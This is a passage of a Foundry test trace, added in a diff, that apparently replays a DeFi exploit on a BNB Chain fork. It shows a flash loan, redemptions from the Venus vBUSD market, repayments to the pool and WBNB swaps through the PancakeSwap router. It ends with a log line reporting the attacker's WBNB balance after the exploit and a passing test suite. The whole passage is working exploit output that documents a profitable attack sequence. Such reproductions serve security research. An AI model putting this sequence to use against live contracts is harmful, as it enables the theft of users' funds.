+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 36893488147421310395 [3.689e19], 24763280000 [2.476e10], 1687350205 [1.687e9], 1687350205 [1.687e9], 36893488147421310395 [3.689e19]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 247632800000000000000 [2.476e20]
+    │   │   │   │   │   │   │   ├─ [1162] Unitroller::vaiController() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [494] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::vaiController() [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000004065d34c6b18ce4370ced1cebde94865dbfafe
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000004065d34c6b18ce4370ced1cebde94865dbfafe
+    │   │   │   │   │   │   │   ├─ [4310] 0x004065D34C6b18cE4370ced1CeBDE94865DbFAFE::getVAIRepayAmount(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [3639] 0x8A1e5Db8f622B97f4bCceC4684697199C1B1D11b::getVAIRepayAmount(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [1230] Unitroller::mintedVAIs(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [559] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::mintedVAIs(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [561] 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63::balanceOf(Unitroller: [0xfD36E2c2a6789Db23113685031d7F16329158384]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 14801404367740170864091001 [1.48e25]
+    │   │   │   │   │   │   ├─ [3581] vBUSD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2145] vBUSD::delegateToImplementation(0x70a082310000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [488] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 53675881533888187 [5.367e16]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000beb1ee0bd556bb
+    │   │   │   │   │   │   │   └─ ← [Return] 53675881533888187 [5.367e16]
+    │   │   │   │   │   │   ├─ emit DistributedSupplierVenus(param0: vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 1458061503017301999466356090470642549036336 [1.458e42])
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [531] BUSD::balanceOf(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 23905043702920857656875424 [2.39e25]
+    │   │   │   │   ├─ [1080] Unitroller::treasuryPercent() [staticcall]
+    │   │   │   │   │   ├─ [412] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::treasuryPercent() [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [23171] BUSD::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11891269826866403367786530 [1.189e25])
+    │   │   │   │   │   ├─ emit Transfer(from: vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 11891269826866403367786530 [1.189e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], value: 53675881533888187 [5.367e16])
+    │   │   │   │   ├─ emit Redeem(redeemer: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], redeemAmount: 11891269826866403367786530 [1.189e25], redeemTokens: 53675881533888187 [5.367e16])
+    │   │   │   │   ├─ [1012] Unitroller::redeemVerify(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11891269826866403367786530 [1.189e25], 53675881533888187 [5.367e16])
+    │   │   │   │   │   ├─ [399] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::redeemVerify(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11891269826866403367786530 [1.189e25], 53675881533888187 [5.367e16]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [3271] USDT::transfer(pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], 18528422194084249665437559 [1.852e25])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], value: 18528422194084249665437559 [1.852e25])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [3271] BUSD::transfer(pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], 11891269826866403367786530 [1.189e25])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], value: 11891269826866403367786530 [1.189e25])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [22320] WBNB::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [54059] Router::swapTokensForExactTokens(1852842218408424966544 [1.852e21], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955], pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], 1687350211 [1.687e9])
+    │   │   │   ├─ [2893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 19841429011936004377380645 [1.984e25], 80066067724761868600425 [8.006e22], 1687350211 [1.687e9]
+    │   │   │   ├─ [8225] WBNB::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 7496208248425788150 [7.496e18])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, value: 7496208248425788150 [7.496e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [31964] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::swap(1852842218408424966544 [1.852e21], 0, pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], 0x)
+    │   │   │   │   ├─ [8071] USDT::transfer(pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], 1852842218408424966544 [1.852e21])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, to: pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], value: 1852842218408424966544 [1.852e21])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [531] USDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 19839576169717595952414101 [1.983e25]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 80073563933010294388575 [8.007e22]
+    │   │   │   │   ├─ emit Sync(reserve0: 19839576169717595952414101 [1.983e25], reserve1: 80073563933010294388575 [8.007e22])
+    │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 7496208248425788150 [7.496e18], amount0Out: 1852842218408424966544 [1.852e21], amount1Out: 0, to: pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Return] [7496208248425788150 [7.496e18], 1852842218408424966544 [1.852e21]]
+    │   │   ├─ [56779] Router::swapTokensForExactTokens(1189126982686640336779 [1.189e21], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], 1687350211 [1.687e9])
+    │   │   │   ├─ [2893] 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 52644208436125961042152 [5.264e22], 13015884730111250411714748 [1.301e25], 1687350211 [1.687e9]
+    │   │   │   ├─ [8225] WBNB::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, 4822052278730673748 [4.822e18])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, value: 4822052278730673748 [4.822e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [34764] 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16::swap(0, 1189126982686640336779 [1.189e21], pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], 0x)
+    │   │   │   │   ├─ [10871] BUSD::transfer(pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], 1189126982686640336779 [1.189e21])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, to: pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], value: 1189126982686640336779 [1.189e21])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 52649030488404691715900 [5.264e22]
+    │   │   │   │   ├─ [531] BUSD::balanceOf(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 13014695603128563771377969 [1.301e25]
+    │   │   │   │   ├─ emit Sync(reserve0: 52649030488404691715900 [5.264e22], reserve1: 13014695603128563771377969 [1.301e25])
+    │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 4822052278730673748 [4.822e18], amount1In: 0, amount0Out: 0, amount1Out: 1189126982686640336779 [1.189e21], to: pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Return] [4822052278730673748 [4.822e18], 1189126982686640336779 [1.189e21]]
+    │   │   └─ ← [Stop] 
+    │   ├─ [531] USDT::balanceOf(pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818]) [staticcall]
+    │   │   └─ ← [Return] 18530275036302658090404103 [1.853e25]
+    │   ├─ [531] BUSD::balanceOf(pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818]) [staticcall]
+    │   │   └─ ← [Return] 11892458953849090008123309 [1.189e25]
+    │   ├─ emit Flash(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 18528422184084249665437559 [1.852e25], param3: 11891269826866403367786530 [1.189e25], param4: 1852852218408424966544 [1.852e21], param5: 1189126982686640336779 [1.189e21])
+    │   └─ ← [Stop] 
+    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 441905524988599288965 [4.419e20]
+    ├─ [2444] WBNB::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance after exploit", val: 441905524988599288965 [4.419e20], decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 426.93ms (28.00ms CPU time)
+
+Ran 2 test suites in 430.69ms (747.21ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
